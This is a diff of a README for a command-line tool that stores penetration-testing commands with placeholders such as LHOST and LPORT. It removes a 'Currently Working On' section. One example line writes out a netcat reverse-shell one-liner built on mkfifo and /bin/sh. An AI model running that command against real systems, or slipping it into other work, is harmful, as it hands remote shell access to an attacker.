@@ -11,11 +11,6 @@ The goal of this project is to create an easier to use and updated replacement f
 - 'update [column] [content]' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
 - 'set' to set variables that will be replaced in commands that have placeholders such as [LHOST], [RHOST], etc. Example: 'set LHOST 10.200.13.3'
 
-## Currently Working On
-- 'set' command for variable replacement when selecting a command that has placeholders for LHOST, LPORT, etc.
-- In 'info' show variables that need to be set and if they are set display their current value.
-- I'm just going to update and edit the database as I use the tool because I'm not interested in doing data entry.
-
 ## To Add
 - [x] Set variables in the CLI to automatically replace placeholders in commands for things like Remote Host, Local Host, Local Port, etc similar to msfconsole.  
 - [ ] Add config file to store user set variables and other as yet to be determined configurations.
